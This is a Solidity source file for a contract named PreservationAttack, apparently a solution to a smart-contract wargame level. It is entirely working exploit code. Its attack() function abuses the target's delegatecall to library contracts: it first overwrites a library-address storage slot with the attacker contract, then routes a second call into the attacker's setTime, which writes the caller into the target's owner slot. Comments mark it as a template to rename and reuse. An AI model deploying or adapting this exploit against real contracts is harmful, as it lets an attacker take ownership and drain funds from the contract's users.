// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPreservation { // 1) change interface name
    function setFirstTime(uint256 _timeStamp) external;
    function setSecondTime(uint256 _timeStamp) external;
    function owner() external view returns (address);
}

contract PreservationAttack { // 2) change nameattck

    address timeZone1Library;
    address timeZone2Library;
    address owner;
    IPreservation target;

    constructor(address _target) {
        target = IPreservation(_target);
    }
    function attack() external {

        target.setSecondTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(address(msg.sender))));
        
    }

    function setTime(uint256 time) external {

        owner = address(uint160(time));
    }
}